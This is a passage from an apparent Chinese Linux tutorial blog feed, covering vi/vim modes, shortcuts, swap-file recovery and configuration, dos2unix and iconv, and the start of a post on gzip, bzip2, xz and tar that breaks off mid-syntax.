mode</strong>(命令行模式)</p><ul><li>一般模式下输入<code>:、/、?</code>都可以进入命令行模式</li><li>可以读取、存储文件</li><li><code>esc</code>退出</li></ul></li></ul><p>三者的关系如下图</p><ul><li>注意编辑模式和命令行模式不能互相转换</li></ul><h3 id="vi按键说明"><a href="#vi按键说明" class="headerlink" title="vi按键说明"></a>vi按键说明</h3><h4 id="一般命令模式"><a href="#一般命令模式" class="headerlink" title="一般命令模式"></a>一般命令模式</h4><p><strong>1.移动光标</strong></p><table><thead><tr><th>按键</th><th align="left">含义</th></tr></thead><tbody><tr><td>h或者←</td><td align="left">光标向左移动一个字符</td></tr><tr><td>j或↓</td><td align="left">向下移动</td></tr><tr><td>k或↑</td><td align="left">向上移动</td></tr><tr><td>l或→</td><td align="left">向右移动（特殊用法：10j/↓代表向下移动10行）</td></tr><tr><td>ctrl+f</td><td align="left">向下移动一页，相当于PD</td></tr><tr><td>ctrl+b</td><td align="left">向上移动一页，相当于PU</td></tr><tr><td>ctrl+d</td><td align="left">向下移动半页</td></tr><tr><td>ctrl+u</td><td align="left">向上移动半页</td></tr><tr><td>+</td><td align="left">移动到非空格符的下一行</td></tr><tr><td>-</td><td align="left">非空格符的上一行</td></tr><tr><td>n<code>space</code></td><td align="left">n代表数字，数字接<code>space</code>代表移动多少个字符</td></tr><tr><td>0或<code>home</code></td><td align="left">移动到行首</td></tr><tr><td>$或<code>end</code></td><td align="left">移动到行末</td></tr><tr><td>H</td><td align="left">移动屏幕首行字符</td></tr><tr><td>M</td><td align="left">移动屏幕中央行首字符</td></tr><tr><td>L</td><td align="left">移动屏幕末行首字符</td></tr><tr><td>G</td><td align="left">移动到文件最后一行</td></tr><tr><td>nG</td><td align="left">表示移动到第n行</td></tr><tr><td>n<code>enter</code></td><td align="left">表示向下移动n行</td></tr></tbody></table><p><strong>2.查找替换</strong></p><table><thead><tr><th>按键</th><th>含义</th></tr></thead><tbody><tr><td>/word</td><td>向下寻找word</td></tr><tr><td>?word</td><td>向上寻找word</td></tr><tr><td>n</td><td>继续上一个寻找动作</td></tr><tr><td>N</td><td>反向n</td></tr><tr><td>:n1,n2s/word1/word2/g</td><td>从n1行到n2行将word1替换成word2</td></tr><tr><td>:1,$s/word1/word2/g</td><td>全文替换</td></tr><tr><td>:1,$s/word1/word2/gc</td><td>替换时提醒用户</td></tr></tbody></table><p><strong>3.删除、复制粘贴</strong></p><table><thead><tr><th>按键</th><th>含义</th></tr></thead><tbody><tr><td>x、X</td><td>x相当于<code>del</code>，X相当于<code>backspace</code></td></tr><tr><td>nx</td><td>表示向后删除n个字符</td></tr><tr><td>dd</td><td>剪切光标所在的一行</td></tr><tr><td>ndd</td><td>剪切光标所在的向下n行</td></tr><tr><td>d1G</td><td>剪切光标到第一行</td></tr><tr><td>dG</td><td>剪切光标到最后</td></tr><tr><td>d$</td><td>剪切光标到本行末字符</td></tr><tr><td>d0</td><td>剪切光标到本行首字符</td></tr><tr><td>yy</td><td>复制光标在的一行</td></tr><tr><td>nyy</td><td>复制光标所在的向下n行</td></tr><tr><td>y1G</td><td>复制光标到第一行</td></tr><tr><td>yG</td><td>复制光标到最后一行</td></tr><tr><td>y0</td><td>复制光标到行首字符</td></tr><tr><td>y$</td><td>复制光标到行末字符</td></tr><tr><td>p&amp;P</td><td>如果复制的是一串字符，p会粘贴到光标后面，P粘贴到光标前面；如果复制几行，p粘贴到光标下一行，P粘贴到光标上一行</td></tr><tr><td>J</td><td>将光标所在下一行结合成一行，前面可以接n</td></tr><tr><td>c</td><td>重复删除多个数据，删除10行，10cj</td></tr><tr><td>u</td><td>恢复一个操作</td></tr><tr><td><code>ctrl</code>+r</td><td>撤销一个操作</td></tr><tr><td><code>.</code></td><td>复制前一个操作</td></tr></tbody></table><h4 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h4><table><thead><tr><th>按键</th><th>含义</th></tr></thead><tbody><tr><td>i&amp;I</td><td>i从当前光标插入，I从光标所在行的第一个非空格字符处插入</td></tr><tr><td>a&amp;A</td><td>a从光标下一个字符插入，A从所在行最后一个字符插入</td></tr><tr><td>o&amp;O</td><td>o从光标下一行插入<strong>新</strong>的一行，O从光标上插入</td></tr><tr><td>r&amp;R</td><td>进入replace mode（替换模式），r会替换光标的那个字符，R则是一直处于替换模式，直到<code>esc</code></td></tr></tbody></table><h4 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h4><table><thead><tr><th>按键</th><th>含义</th></tr></thead><tbody><tr><td>:w</td><td>写入硬盘</td></tr><tr><td>:w！</td><td>文件为只读时，强制写入，还是要看用户的权限</td></tr><tr><td>:q</td><td>退出vi</td></tr><tr><td>:q！</td><td>强制退出，比如做了修改不想保存时</td></tr><tr><td>:wq</td><td>保存退出，可接！</td></tr><tr><td>ZZ</td><td>没修改时，则直接退出，修改了后，则保存退出</td></tr><tr><td>:w [path/filename]</td><td>另存文件，后面接路径和文件名</td></tr><tr><td>:r [path/filename]</td><td>读取文件，在现有文件中读取另一个文件到这个文件中</td></tr><tr><td>:n1,n2 w [path/filename]</td><td>将n1-n2行的数据保存到另一个文件</td></tr><tr><td>:！comman</td><td>暂时退出vi执行command指令</td></tr><tr><td>:set nu</td><td>显示行号</td></tr><tr><td>:set nonu</td><td>不显示行号</td></tr></tbody></table><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>进行vim编辑时，会临时有一个缓存文件<code>.filename.swp</code></p><ul><li>当文件正常保存时，缓存文件会自动删除</li><li>当电脑突然宕机时，缓存文件不会消失，可使用缓存来恢复工作</li></ul><p><code>ctrl+z</code>可暂时将编辑工作放入后台，可以看到缓存文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[1]+  已停止               vim /tmp/my_vim/services</span><br><span class="line">[root@study ~]<span class="comment"># cd /tmp/my_vim/</span></span><br><span class="line">[root@study my_vim]<span class="comment"># ls -al</span></span><br><span class="line">总用量 720</span><br><span class="line">drwxr-xr-x.   2 root root     62 1月  16 03:38 .</span><br><span class="line">drwxrwxrwt. 141 root root  12288 1月  16 03:47 ..</span><br><span class="line">-rw-r--r--.   1 root root   4847 1月  15 21:47 man_db.conf</span><br><span class="line">-rw-r--r--.   1 root root 670293 1月  15 21:45 services</span><br><span class="line">-rw-r--r--.   1 root root  40960 1月  16 03:40 .services.swp</span><br></pre></td></tr></table></figure><p><code>kill -9 %1</code>可以杀死刚才的后台，模拟非正常保存</p><p>此时我再打开文件，会出现警告（汉化万岁！！！！）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">E325: 注意</span><br><span class="line">发现交换文件 <span class="string">&quot;/tmp/my_vim/.services.swp&quot;</span></span><br><span class="line">            所有者: root    日期: Thu Jan 16 03:40:56 2020</span><br><span class="line">            文件名: /tmp/my_vim/services</span><br><span class="line">            修改过: 是</span><br><span class="line">            用户名: root      主机名: study.centos.vbird</span><br><span class="line">           进程 ID: 11776</span><br><span class="line">正在打开文件 <span class="string">&quot;/tmp/my_vim/services&quot;</span></span><br><span class="line">              日期: Wed Jan 15 21:45:18 2020</span><br><span class="line"></span><br><span class="line">(1) Another program may be editing the same file.  If this is the <span class="keyword">case</span>,</span><br><span class="line">    be careful not to end up with two different instances of the same</span><br><span class="line">    file when making changes.  Quit, or <span class="built_in">continue</span> with caution.</span><br><span class="line">(2) An edit session <span class="keyword">for</span> this file crashed.</span><br><span class="line">    如果是这样，请用 <span class="string">&quot;:recover&quot;</span> 或 <span class="string">&quot;vim -r /tmp/my_vim/services&quot;</span></span><br><span class="line">    恢复修改的内容 (请见 <span class="string">&quot;:help recovery&quot;</span>)。</span><br><span class="line">    如果你已经进行了恢复，请删除交换文件 <span class="string">&quot;/tmp/my_vim/.services.swp&quot;</span></span><br><span class="line">    以避免再看到此消息。</span><br><span class="line"></span><br><span class="line">交换文件 <span class="string">&quot;/tmp/my_vim/.services.swp&quot;</span> 已存在！</span><br><span class="line">以只读方式打开([O]), 直接编辑((E)), 恢复((R)), 删除交换文件((D)), 退出((Q)), 中止((A)):</span><br></pre></td></tr></table></figure><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>vim与vi的比较</p><ol><li>有语法高亮</li><li>更多的程序语法</li><li>可以debug</li></ol><h3 id="可视区块（Visual-block）"><a href="#可视区块（Visual-block）" class="headerlink" title="可视区块（Visual block）"></a>可视区块（Visual block）</h3><p>在这个模式下，我们可以对文本镜进入行选择，列选择</p><table><thead><tr><th>按键</th><th>含义</th></tr></thead><tbody><tr><td>v</td><td>字符选择，将光标经过的地方选择</td></tr><tr><td>V</td><td>行选择，将光标经过的行选择</td></tr><tr><td><code>ctrl</code>+v</td><td>列选择，将光标经过的列选择</td></tr><tr><td>y</td><td>将选择的地方复制</td></tr><tr><td>p</td><td>在光标处粘贴复制的区块</td></tr><tr><td>d</td><td>删除选择的地方</td></tr></tbody></table><h3 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h3><p>我们有时候会编辑多个文件，有着不同的编辑方式</p><table><thead><tr><th>按键</th><th>含义</th></tr></thead><tbody><tr><td>:n</td><td>下一个文件</td></tr><tr><td>:N</td><td>上一个文件</td></tr><tr><td>:files</td><td>列出这个vim打开的文件</td></tr></tbody></table><h4 id="1-在多个vim窗口编辑"><a href="#1-在多个vim窗口编辑" class="headerlink" title="1.在多个vim窗口编辑"></a>1.在多个vim窗口编辑</h4><p>操作很简单，但如果想将A文件的内容复制到B去，需要用鼠标选中复制粘贴，这样有一个缺点，那就是A文件<code>tab</code>会被鼠标转换成空格，导致内容无法对齐，可以采用另一种编辑方式</p><h4 id="2-使用一个vim窗口编辑"><a href="#2-使用一个vim窗口编辑" class="headerlink" title="2.使用一个vim窗口编辑"></a>2.使用一个vim窗口编辑</h4><ul><li><code>vim file1 file2</code>打开两个文件</li><li>在命令模式下使用 <code>:e file</code>打开文件</li><li>使用:files可以查看打开了多少个文件</li></ul><h3 id="多窗口功能"><a href="#多窗口功能" class="headerlink" title="多窗口功能"></a>多窗口功能</h3><p>当有一个非常的文本文件时，我想在首行和末行操作时，需不需要来回费劲的G和翻页呢？</p><p>我们可以使用<code>:sp</code>来再次打开这个文件，这时出现的则是同一个文件在两个窗口中</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/vim-sp.png" alt="vim-sp"></p><table><thead><tr><th>组合按键</th><th>含义</th></tr></thead><tbody><tr><td>:sp [filename]</td><td>水平新建窗口，默认打开同一文件，有其他文件则打开其他文件</td></tr><tr><td>:vsplit filename</td><td>垂直</td></tr><tr><td><code>ctrl</code>+w+j/↓</td><td>按住ctrl，按下w再按j，将光标移动到下一个窗口</td></tr><tr><td><code>ctrl</code>+w+k/↑</td><td>移动到上一个窗口</td></tr><tr><td><code>ctrl</code>+w+q</td><td>退出这个窗口，也可以在这个窗口输入:q，或者:close</td></tr></tbody></table><h3 id="vim关键字补全"><a href="#vim关键字补全" class="headerlink" title="vim关键字补全"></a>vim关键字补全</h3><p>类似Hbuild、sublime的关键字补全功能，识别语法补全关键字，vim也是可以的</p><table><thead><tr><th>组合按键</th><th>含义</th></tr></thead><tbody><tr><td><code>ctrl</code>+x <code>-&gt;</code> <code>ctrl</code>+o</td><td>通过正在编辑的文件的内容作为关键字，进行补齐</td></tr><tr><td><code>ctrl</code>+x <code>-&gt;</code> <code>ctrl</code>+f</td><td>以当前目录内的文件名作为关键词，进行补齐</td></tr><tr><td><code>ctrl</code>+x <code>-&gt;</code> <code>ctrl</code>+n</td><td>以扩展名作为语法补充，通过vim内置关键字补齐</td></tr></tbody></table><p> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/vim-buqi.png" alt="补齐"></p><h3 id="vim环境设置与记录"><a href="#vim环境设置与记录" class="headerlink" title="vim环境设置与记录"></a>vim环境设置与记录</h3><ul><li>vim有一个主动记录操作的文件<code>~/.viminfo</code>，这样你每次重新打开文件都会回到上次的工作状态</li><li>vim的环境设置参数也有很多</li></ul><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>:set nu/nonu</td><td>设置/取消行号</td></tr><tr><td>:set hlsearch/nohlsearch</td><td>high light search，高亮查找</td></tr><tr><td>:set autoindent/noautoindent</td><td>自动缩进</td></tr><tr><td>:set backup/nobackup</td><td>自动备份文件，例如，在编辑host时，会有一个host~的文件记录源文件</td></tr><tr><td>:set ruler</td><td>显示右下角的状态</td></tr><tr><td>:set showmode</td><td>显示各种模式</td></tr><tr><td>:set backspace=(012)</td><td>2代表可以删除任何字符，0和1代表只能删除输入的字符</td></tr><tr><td>:set all</td><td>显示设置的所有环境参数</td></tr><tr><td>:set</td><td>显示与系统默认的参数不同的参数</td></tr><tr><td>:syntax on/off</td><td>程序语法，开启会有高亮debug</td></tr><tr><td>:set bg=light/dark</td><td>背景色调</td></tr></tbody></table><p>不可能每次进入文件都要设置，需要一个配置文件</p><p>整体的vim设置值在/etc/vimrc中，这个文件不建议修改，可以自行建立一个文件~/.vimrc</p><p><strong>格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@study my_vim]<span class="comment"># vim ~/.vimrc</span></span><br><span class="line"><span class="string">&quot;代表注释</span></span><br><span class="line"><span class="string">set hlsearch   &quot;</span>high light</span><br></pre></td></tr></table></figure><h2 id="vim使用的问题"><a href="#vim使用的问题" class="headerlink" title="vim使用的问题"></a>vim使用的问题</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/dos&unix-q.png" alt="DOS和Linux换行符"></p><p>test是我在windows上编辑的，test2是我在Linux上编辑的</p><p>可以看到dos使用的换行符是^M$(CRLF)，Linux使用的换行符是$(LF)</p><p>一般没什么问题，但当文件是一个shell脚本程序时，Linux会误判，导致程序无法运行，需要将CR去掉才行（批量替换？）</p><p>有一个简单的命令<code>dos2unix</code>可以直接将格式转换</p><p>但是这个指令默认没有安装，安装方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@study my_vim]<span class="comment"># mount /dev/sr0 /mnt</span></span><br><span class="line">mount: /dev/sr0 写保护，将以只读方式挂载</span><br><span class="line">[root@study my_vim]<span class="comment"># rpm -ivh /mnt/Packages/dos2unix-*</span></span><br><span class="line">警告：/mnt/Packages/dos2unix-6.0.3-7.el7.x86_64.rpm: 头V3 RSA/SHA256 Signatrue, 密钥 ID f4a80eb5: NOKEY</span><br><span class="line">准备中...                          <span class="comment">################################# [100%]</span></span><br><span class="line">正在升级/安装...</span><br><span class="line">   1:dos2unix-6.0.3-7.el7             <span class="comment">################################# [100%]</span></span><br></pre></td></tr></table></figure><p>命令语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dos2unix [-kn] file [newfile]</span><br><span class="line">unix2dos [-kn] file [newfile]</span><br><span class="line">-k:保留原本的mtime格式</span><br><span class="line">-n:保留旧文件，后面接旧文件</span><br></pre></td></tr></table></figure><h3 id="语系编码转换指令iconv"><a href="#语系编码转换指令iconv" class="headerlink" title="语系编码转换指令iconv"></a>语系编码转换指令iconv</h3><p>语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iconv --list</span><br><span class="line">iconv -f 原本编码 -t 新编码 filename [-o newfile]</span><br><span class="line">--list:列出支持的编码</span><br><span class="line">-f:from</span><br><span class="line">-t:to</span><br><span class="line">-o file:保留旧文件，得到新文件</span><br></pre></td></tr></table></figure><p>将utf-8繁体转换utf-8简体的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t big5 file | iconv -f big5 -t gb2312 | iconv -f gb2312 -t utf8 -o file.utf8</span><br></pre></td></tr></table></figure><h2 id="实战技巧"><a href="#实战技巧" class="headerlink" title="实战技巧"></a>实战技巧</h2><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>w 或 W</td><td>光标移动至下一个单词的单词首</td></tr><tr><td>b 或 B</td><td>光标移动至上一个单词的单词首</td></tr><tr><td>e 或 E</td><td>光标移动至下一个单词的单词尾</td></tr><tr><td>nw 或 nW</td><td>n 为数字，表示光标向右移动 n 个单词</td></tr><tr><td>nb 或 nB</td><td>n 为数字，表示光标向左移动 n 个单词</td></tr></tbody></table><h3 id="Vim光标移动到匹配的括号处"><a href="#Vim光标移动到匹配的括号处" class="headerlink" title="Vim光标移动到匹配的括号处"></a>Vim光标移动到匹配的括号处</h3><p>程序员在编辑程序时，经常会为将光标移动到与一个 “(“ 匹配的 “)” （对于 [] 和 {} 也是一样的）处而感到头疼。Vim 里面提供了一个非常方便地査找匹配括号的命令，这就是 “%”。</p><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><ol><li><p>首先按<code>esc</code>进入命令行模式下，按下<code>Ctrl + v</code>，进入列（也叫区块）模式;</p></li><li><p>在行首使用上下键选择需要注释的多行;</p></li><li><p>按下键盘（大写）<code>“I”</code>键，进入插入模式；</p></li><li><p>然后输入注释符（<code>“//”、“#”</code>等）;</p></li><li><p>最后按下<code>“Esc”</code>键</p></li></ol><ul><li>注：在按下 <code>esc</code>键后，会稍等一会才会出现注释，不要着急~时间很短的</li></ul><blockquote><p>使用<code>&gt;</code>配合ctrl+v可进行整体缩进</p></blockquote><h3 id="代码折叠"><a href="#代码折叠" class="headerlink" title="代码折叠"></a>代码折叠</h3><p><a href="https://www.jianshu.com/p/16e0b822b682">https://www.jianshu.com/p/16e0b822b682</a></p><h3 id="打开多个文件、同时显示多个文件、在文件之间切换"><a href="#打开多个文件、同时显示多个文件、在文件之间切换" class="headerlink" title="打开多个文件、同时显示多个文件、在文件之间切换"></a><a href="https://www.cnblogs.com/pengdonglin137/p/3525297.html">打开多个文件、同时显示多个文件、在文件之间切换</a></h3><p><strong>打开多个文件</strong></p><p><code>vim file1 file2 ... file</code></p><p><code>:open file</code></p><p><code>:e file</code></p><p><strong>在文件之间切换</strong></p><p><code>Ctrl+6</code>—下一个文件</p><p><code>:bn</code>—下一个文件</p><p><code>:bp</code>—上一个文件</p><p><code>:bd [num1,num2]/[filename]</code>-关闭buffer</p><p><strong>多文档编辑的命令</strong></p><p><code>:n</code>     编辑下一个文档。</p><p><code>:2n</code>    编辑下两个文档。</p><p><code>:N</code>     编辑上一个文档。注意，该方法只能用于同时打开多个文档。</p><p><code>:e</code> 文档名    这是在进入vim后，不离开 vim 的情形下打开其他文档。</p><p><code>:e# 或 Ctrl+ˆ</code>   编辑上一个文档,用于两个文档相互交换编辑时使用。?# 代表的是编辑前一次编辑的文档</p><p><code>:files 或 :buffers 或 :ls</code>   可以列出目前 缓冲区 中的所有文档。加号 + 表示 缓冲区已经被修改过了。＃代表上一次编辑的文档，%是目前正在编辑中的文档</p><p><code>:b 文档名或编号</code>   移至该文档。</p><p><code>:f 或 Ctrl+g</code>   显示当前正在编辑的文档名称。</p><p><code>:f filename</code>     改变编辑中的文档名。(file)</p><p><strong>多文件切换</strong></p><ol><li>通过vim打开多个文件（可以通过ctags或者cscope）</li><li>“:ls”查看当前打开的buffer（文件）</li><li>“:b num”切换文件（其中num为buffer list中的编号）</li></ol><p><strong>其他快捷键</strong></p><p>表示范围的命令：</p><p>l： 表示一个字符，可以于操作符组合使用；</p><p>aw ：表示单词+空格，前面可以加数字的</p><p>iw：  选中单词/空格； 前面可以加数字；</p><p>ap： 表示一个段落，与操作符组合使用；</p><p>跳转的指令：</p><p>G键是跳转命令。默认跳到最后一行；前面可以加数字的；表示跳到第几行；</p><p>gg键为跳转命令，默认跳到第一行，前面可以加数字，表示跳到第几行；</p><p>0： 跳转命令，跳到行首 ；</p><p>$:  表示跳到行尾；</p><p>w:  表示跳转到下一个单词的头部；</p><p>e:  表示跳转到下一个单词的尾部；</p><p>b：   表示跳转到上一个单词的头部；</p><p>ge：表示跳转到上一位单词的尾差部；</p><p>A： 跳转到行尾，并进行插入模式；</p><p>I： 跳转到行首，并进行插入模式；</p><p>H: 当前页的页首；</p><p>M：当前页的页中间；</p><p>L：当前页的页尾；</p><p>zz：让光标所在的行居于屏幕中央；</p><p>操作功能符：</p><p><code>&gt;</code>: 表示向右缩进的动作；</p><p><code>&lt;</code>: 表示减少缩进；</p><p><code>gu</code>: 转换为小写的动作；</p><p><code>gU</code>: 转换为大写的动作；</p><p><code>u/U</code>：在可视模式下，可以用来转换选中的字符；</p><p><code>g~</code>：用于转换——小写变大写，大写变小写；</p><p><code>x</code>：删除光标下的字符；</p><p><code>s</code>：删除光标下的字符并进入插入模式；</p><p><code>X</code>：用于删除光标之前的字符；</p><p><code>c</code>：为一个动作，删除并进入插入模式，可以组合使用，如cw， cG等；</p><p><code>cc</code>：表示删除本行并进行插入模式；</p><p><code>J</code>： 把当前行与下一行连接在一起；</p><p><code>K</code>: 用于查看处于光标之下的那个单词的手册页；</p><p><code>r</code>: 用于替换单个字符；</p><p><code>R</code>：用于连续替换多个字符；</p><p>查找操作：</p><p><code>f&#123;word&#125;</code>表示：在行内查找下一个指定的字符，前面可以加数字，表示第几个字符； （用；与，进行前进与退回）</p><p><code>F&#123;word&#125;</code>表示：在行内查找上一个指定的字符，前面可以加数字，表示第几个字符； （用；与，进行前进与退回）</p><p><code>/&#123;pattern&#125;</code>表示：在文档内查找下一处匹配的项(用 n 和 N 进行前进与返回,  gn与gN会进行面对字符的可视模式， 下同；）</p><p><code>?&#123;pattern&#125;</code>表示：在文档内查找上一处匹配的项(用 n 和 N 进行前进与返回）</p><p><code>*</code> 表示：向下查找光标下的单词，前面可以加数字(用 n 和 N 进行前进与返回）</p><p><code>#</code> 表示：向止查找光标下的单词，前面可以加数字(用 n 和 N 进行前进与返回）</p><p>与 ctrl 相关的快捷键：</p><p>ctrl-g 表示显示文件信息；</p><p>ctrl-f 向下翻一页；</p><p>ctrl-b 向上翻一页；</p><p>ctrl-d 向下翻半页；</p><p>ctrl-u 向下翻半页；</p><p><strong>精准跳转和修改</strong></p><p>我个人感觉 vim 快最重要的原因就是精准选择。而实现精准选择的必要途径就是搜索。<br>搜索是 vim 的核心。比如说你需要跳到下个函数，那直接/def。再比如需要跳到括号末，直接f)。终端中，刚输入完python eval.py device cuda data.batch_size 256，发现这行指令中的python要改成python3，可以 直接Fna3。又发现前面要加sudo，直接^isudo。总之一切精确修改都是通过搜索来完成的，这与我们不使用vim编程时搜索只用来查找代码有本质区别</p><p>结合v V ctrl+v 这三种可视化模式进行精确选择，配合cdyrp等指令，可以完成极其灵活的代码增删改查。到这一步你会发现vim对你编程速度的提高已经是革命性的了</p><p><strong>数字增减</strong></p><p>normal模式下</p><p>ctrl-a<br>ctrl-x</p><p><strong>删减词</strong></p><p>normal:</p><p>daw<br>dw<br>cw<br>ctrl+w</p><p>insert mode: ctrl+w</p><p><strong>区块选择</strong></p><ul><li>vi” → 会选择 foo.</li><li>va” → 会选择 “foo”.</li><li>vi) → 会选择 “foo”.</li><li>va) → 会选择(“foo”).</li><li>v2i) → 会选择 map (+) (“foo”)</li><li>v2a) → 会选择 (map (+) (“foo”))</li></ul><p><strong>与系统剪贴板交互</strong></p><p>输入 <code>vim --version</code> 查看是否支持 clipboard</p><p>支持则使用 <code>&quot;y+</code> 将vim选区复制进系统剪贴板<br>同理，使用 <code>&quot;p+</code> 粘贴系统剪贴板</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vi </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（七）压缩与备份</title>
      <link href="/Linux/7.%E5%8E%8B%E7%BC%A9%E4%B8%8E%E5%A4%87%E4%BB%BD.html"/>
      <url>/Linux/7.%E5%8E%8B%E7%BC%A9%E4%B8%8E%E5%A4%87%E4%BB%BD.html</url>
      
        <content type="html"><![CDATA[<p> 这世界没有压缩怎么行</p><span id="more"></span><h2 id="一、压缩简介"><a href="#一、压缩简介" class="headerlink" title="一、压缩简介"></a>一、压缩简介</h2><p>日常的文件都是由01这两个数字组成的，1B=8bit，记录整数1时，其他位会补零，压缩就是使文件的空余的位放出来，把容量节省出来</p><p><a href="https://www.ietf.org/rfc/rfc1952.txt">更多解释文档</a></p><p>我们常见的压缩包后缀有</p><ul><li><code>*.Z</code></li><li><code>*.zip</code></li><li><code>*.gz</code></li><li><code>*.bz2</code></li><li><code>*.xz</code></li><li><code>*.tar</code></li><li><code>*.tar.gz</code></li><li><code>*.tar.bz2</code></li><li><code>*.tar.xz</code></li></ul><h2 id="二、压缩指令"><a href="#二、压缩指令" class="headerlink" title="二、压缩指令"></a>二、压缩指令</h2><h3 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h3><ul><li>可以解压<code>compress、zip、gzip</code>等软件的压缩包</li><li>建立的压缩包后缀是<code>*.gz</code></li></ul><p><strong>语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gzip [-] file</span><br><span class="line">-c: 将压缩的数据输出到屏幕上</span><br><span class="line">-d: 解压缩</span><br><span class="line">-t: 检验压缩包的一致性</span><br><span class="line">-v: 显示原文件与压缩文件之比</span><br><span class="line">-<span class="comment">#: #可以是1-9的数字，1压缩程度最小，速度快，9压缩程度最好，速度慢，默认-6</span></span><br></pre></td></tr></table></figure><ul><li>要想查看<code>gzip</code>压缩的内容要使用<code>zcat</code>/<code>zmore</code>/<code>zless</code>，查找某数据则使用<code>egrep</code></li><li>因为<code>gzip</code>主要是想替换<code>compress</code>这个压缩软件，所以<code>gzip</code>同样可以解压<code>compress</code>压缩的文件，<code>zcat</code>也可以查看<code>compress</code>压缩的内容</li><li>压缩文件名自定义使用指令<code>gzip -c filename &gt; 自定义文件名.gz</code></li><li>更多高级用法man</li></ul><h3 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h3><p>语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bzip2 [-] file</span><br><span class="line">-c: 将压缩的数据输出到屏幕上</span><br><span class="line">-d: 解压缩</span><br><span class="line">-k: 保留原来的文件</span><br><span class="line">-z:   压缩(默认)</span><br><span class="line">-v: 显示原文件与压缩文件之比</span><br><span class="line">-<span class="comment">#: #可以是1-9的数字，1压缩程度最小，速度快，9压缩程度最好，速度慢，默认-6</span></span><br></pre></td></tr></table></figure><ul><li><p>后缀<code>*.bzip2</code></p></li><li><p>查看压缩内容有bzcat/bzmore/bzless/bzgrep</p></li></ul><h3 id="xz"><a href="#xz" class="headerlink" title="xz"></a>xz</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xz [-] file</span><br><span class="line">-d: 解压缩</span><br><span class="line">-t: 测试压缩文件是否错误</span><br><span class="line">-l: 列出压缩文件的信息</span><br><span class="line">-k: 保留源文件</span><br><span class="line">-c: 输出数据</span><br></pre></td></tr></table></figure><ul><li>后缀<code>*.xz</code></li><li>xzcat/xzmore/xzless/xzgrep</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>三个软件的压缩比从小到大是<code>xz&gt;bzip2&gt;gzip</code>，压缩比越小压缩效率越好</li><li>压缩效率越好花费时间越长</li></ul><h2 id="三、打包指令tar"><a href="#三、打包指令tar" class="headerlink" title="三、打包指令tar"></a>三、打包指令tar</h2><p>使用tar时要自己命名</p><p>语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tar [-z|j|J] [cv|tv|xv] [-f filename] 